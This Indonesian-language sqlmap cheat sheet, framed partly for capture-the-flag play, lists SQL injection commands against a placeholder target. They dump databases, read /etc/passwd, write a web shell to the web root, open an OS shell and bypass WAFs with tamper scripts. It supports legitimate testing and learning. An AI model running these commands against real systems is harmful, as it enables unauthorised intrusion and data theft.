# SQLMap Cheatsheet

## 1. Basic Usage

### 1.1. Menentukan Target

```bash
sqlmap -u "http://target.com/vuln.php?id=1"
```

### 1.2. Menentukan Parameter POST

```bash
sqlmap -u "http://target.com/vuln.php" --data="id=1"
```

### 1.3. Menentukan Cookie

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --cookie="PHPSESSID=xxxx"
```

### 1.4. Menampilkan Database

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --dbs
```

### 1.5. Menampilkan Tables pada Database

```bash
sqlmap -u "http://target.com/vuln.php?id=1" -D nama_database --tables
```

### 1.6. Menampilkan Columns pada Table

```bash
sqlmap -u "http://target.com/vuln.php?id=1" -D nama_database -T nama_tabel --columns
```

### 1.7. Dump Data dari Table

```bash
sqlmap -u "http://target.com/vuln.php?id=1" -D nama_database -T nama_tabel --dump
```

## 2. Advanced Usage

### 2.1. Membaca File dari Server

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --file-read="/etc/passwd"
```

### 2.2. Menulis File ke Server

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --file-write="localfile.txt" --file-dest="/var/www/html/shell.php"
```

### 2.3. Mendapatkan Reverse Shell

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --os-shell
```

### 2.4. Bypass WAF dengan --tamper

- Lihat daftar tamper script:
  ```bash
  sqlmap --list-tampers
  ```
- Contoh penggunaan tamper:
  ```bash
  sqlmap -u "http://target.com/vuln.php?id=1" --tamper="between,randomcase"
  ```

## 3. Tips Tambahan

- Gunakan `--batch` untuk auto-yes semua prompt.
- Gunakan `--risk=3 --level=5` untuk pengujian lebih dalam.

Referensi: [https://sqlmap.org/](https://sqlmap.org/)

## 4. Penggunaan Aman untuk CTF

**Catatan:** Pada CTF, dilarang melakukan brute force yang dapat mengganggu peserta lain. Gunakan opsi berikut untuk membatasi request:

- `--delay=2` : Memberi jeda 2 detik antar request (ganti sesuai kebutuhan).
- `--threads=1` : Gunakan thread minimal (default 1) agar tidak membebani server.

Contoh:

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --delay=2 --threads=1
```

## 5. Penggunaan Proxy

- `--proxy="http://127.0.0.1:8080"` : Mengarahkan traffic sqlmap ke proxy (misal Burp Suite/ZAP).

Contoh:

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --proxy="http://127.0.0.1:8080"
```

---
